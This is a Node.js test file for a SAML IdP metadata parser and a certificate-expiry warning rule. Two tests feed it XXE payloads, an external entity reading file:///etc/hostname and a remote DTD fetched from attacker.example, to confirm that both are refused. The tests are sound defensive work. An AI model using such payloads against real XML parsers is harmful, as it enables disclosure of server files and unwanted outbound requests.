// IdP metadata import + certificate expiry rule (#1933). No Next, no DB.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { DOMParser } from '@xmldom/xmldom';
import {
  parseIdpMetadata,
  certificateInfo,
  preferredCertificate,
  toPem,
  MetadataError,
  MAX_METADATA_BYTES,
} from '../../src/lib/ssoMetadata.ts';
import { certificateStatus, dueWarningStage, daysUntil } from '../../src/lib/ssoCertificateRule.ts';
import { testCertificate, idpMetadataXml, selfSignedCertificate } from '../../e2e/support/x509.mjs';
import crypto from 'node:crypto';

const CERT = testCertificate(365);
const bare = (pem) => pem.replace(/-----[A-Z ]+-----/g, '').replace(/\s+/g, '');
const META = idpMetadataXml({
  entityId: 'https://idp.example.test/entity',
  ssoUrl: 'https://idp.example.test/sso',
  sloUrl: 'https://idp.example.test/slo',
  certificate: CERT,
});

const code = (fn) => {
  try {
    fn();
  } catch (e) {
    assert.ok(e instanceof MetadataError, `expected a MetadataError, got ${e}`);
    return e.code;
  }
  assert.fail('expected the parser to refuse');
};

test('reads issuer, the HTTP-Redirect entry point, the signing certificate and SLO', () => {
  const m = parseIdpMetadata(META);
  assert.equal(m.issuer, 'https://idp.example.test/entity');
  assert.equal(m.entryPoint, 'https://idp.example.test/sso');
  assert.deepEqual(m.certificates, [bare(CERT)]);
  assert.equal(m.sloUrl, 'https://idp.example.test/slo');
});

test('falls back to the POST binding; an encryption-only key is not a signing key', () => {
  const xml = `<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" entityID="urn:idp">
    <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
      <KeyDescriptor use="encryption"><ds:KeyInfo><ds:X509Data><ds:X509Certificate>AAAA</ds:X509Certificate></ds:X509Data></ds:KeyInfo></KeyDescriptor>
      <KeyDescriptor><ds:KeyInfo><ds:X509Data><ds:X509Certificate>
        ${bare(CERT).match(/.{1,64}/g).join('\n        ')}
      </ds:X509Certificate></ds:X509Data></ds:KeyInfo></KeyDescriptor>
      <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location=" https://idp.test/post "/>
    </IDPSSODescriptor>
  </EntityDescriptor>`;
  const m = parseIdpMetadata(xml);
  assert.equal(m.entryPoint, 'https://idp.test/post');
  assert.deepEqual(m.certificates, [bare(CERT)], 'whitespace inside the certificate is stripped');
  assert.equal(m.sloUrl, undefined);
});

test('an IdP inside an EntitiesDescriptor is found', () => {
  const inner = META.replace(/^<\?xml[^>]*>\s*/, '');
  const m = parseIdpMetadata(`<md:EntitiesDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata">${inner}</md:EntitiesDescriptor>`);
  assert.equal(m.issuer, 'https://idp.example.test/entity');
});

test('XXE: a DOCTYPE or ENTITY declaration is refused before any parser sees it', () => {
  const xxe = `<?xml version="1.0"?>
<!DOCTYPE md [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="&xxe;"/>`;
  assert.equal(code(() => parseIdpMetadata(xxe)), 'dtd_not_allowed');
  assert.equal(code(() => parseIdpMetadata(xxe.replace('DOCTYPE', 'doctype'))), 'dtd_not_allowed');
  const remote = '<!DOCTYPE x SYSTEM "https://attacker.example/evil.dtd"><x/>';
  assert.equal(code(() => parseIdpMetadata(remote)), 'dtd_not_allowed');
});

test('XXE, defence in depth: the parser itself resolves no external entity', () => {
  // Bypassing our pre-check on purpose: even if it were ever loosened, the
  // parser must not read the file the entity names.
  let hostname = '';
  try {
    hostname = readFileSync('/etc/hostname', 'utf8').trim();
  } catch {
    /* no such file here — the assertion below still holds */
  }
  const doc = new DOMParser({ errorHandler: { warning() {}, error() {}, fatalError() {} } }).parseFromString(
    '<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><r>&xxe;</r>',
    'text/xml',
  );
  const text = doc?.documentElement?.textContent ?? '';
  if (hostname) assert.ok(!text.includes(hostname), 'the external entity was expanded');
});

test('size cap, malformed XML and missing parts are refused with a code', () => {
  assert.equal(code(() => parseIdpMetadata(`<x>${'a'.repeat(MAX_METADATA_BYTES)}</x>`)), 'too_large');
  assert.equal(code(() => parseIdpMetadata('<md:EntityDescriptor')), 'not_xml');
  assert.equal(code(() => parseIdpMetadata('not xml at all')), 'not_xml');
  assert.equal(code(() => parseIdpMetadata('<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="x"/>')), 'no_idp_descriptor');
  assert.equal(code(() => parseIdpMetadata(META.replace(/<md:SingleSignOnService[^>]*>/g, ''))), 'no_sso_service');
  assert.equal(code(() => parseIdpMetadata(META.replace(/<md:KeyDescriptor[\s\S]*<\/md:KeyDescriptor>/, ''))), 'no_certificate');
});

test('certificateInfo reads bare base64 and PEM alike; garbage is null', () => {
  const a = certificateInfo(CERT);
  const b = certificateInfo(bare(CERT));
  assert.ok(a && b);
  assert.equal(a.fingerprintSha256, b.fingerprintSha256);
  assert.match(a.fingerprintSha256, /^([0-9A-F]{2}:){31}[0-9A-F]{2}$/);
  assert.match(a.subject, /e2e-test-idp/);
  assert.ok(a.notAfter > new Date());
  assert.equal(certificateInfo('-----BEGIN CERTIFICATE-----\nMIIBfake\n-----END CERTIFICATE-----'), null);
  assert.equal(certificateInfo(''), null);
  assert.equal(certificateInfo(null), null);
  assert.ok(toPem(bare(CERT)).startsWith('-----BEGIN CERTIFICATE-----\n'));
});

test('preferredCertificate picks the valid one with the latest expiry', () => {
  const soon = testCertificate(10);
  const later = testCertificate(400);
  const expired = testCertificate(-5);
  assert.equal(preferredCertificate([soon, later, expired]), later);
  assert.equal(preferredCertificate([expired, soon]), soon);
  assert.equal(preferredCertificate(['garbage']), 'garbage');
});

test('status: valid, expiring inside 30 days, expired', () => {
  const now = new Date('2026-10-20T12:00:00Z');
  const at = (days) => new Date(now.getTime() + days * 86_400_000);
  assert.deepEqual(certificateStatus(at(31), now), { status: 'valid', daysLeft: 31 });
  assert.deepEqual(certificateStatus(at(30), now), { status: 'expiring', daysLeft: 30 });
  assert.equal(certificateStatus(at(0.5), now).status, 'expiring');
  assert.equal(certificateStatus(at(-0.1), now).status, 'expired');
  assert.equal(daysUntil(at(6.9), now), 6);
});

test('warnings: two mails per certificate, the closest mark wins, a new cert restarts', () => {
  const none = { fingerprint: null, stage: null };
  const due = (daysLeft, sent = none, fingerprint = 'AA') => dueWarningStage({ daysLeft, fingerprint, sent });
  assert.equal(due(45), null);
  assert.equal(due(30), 30);
  assert.equal(due(12), 30);
  assert.equal(due(12, { fingerprint: 'AA', stage: 30 }), null, 'the 30-day mail is not repeated daily');
  assert.equal(due(7, { fingerprint: 'AA', stage: 30 }), 7);
  assert.equal(due(3, { fingerprint: 'AA', stage: 7 }), null, 'nothing after the 7-day mail');
  assert.equal(due(5), 7, 'first seen at 5 days: the 7-day mail only');
  assert.equal(due(-1), null, 'an expired certificate gets no "will expire" mail');
  assert.equal(due(20, { fingerprint: 'BB', stage: 7 }), 30, 'a rotated certificate starts afresh');
});

test('a certificate with a malformed validity time is unparseable, not "valid forever"', () => {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const pem = selfSignedCertificate(publicKey, privateKey, 'bad-time', undefined, {
    notBefore: new Date('2026-01-01T00:00:00Z'),
    rawNotAfter: '991399999999Z', // month 13: node reports 'Bad time value'
  });
  assert.equal(new crypto.X509Certificate(pem).validTo, 'Bad time value', 'node still parses the certificate');
  assert.equal(certificateInfo(pem), null);
  assert.equal(preferredCertificate([pem, CERT]), CERT);
});
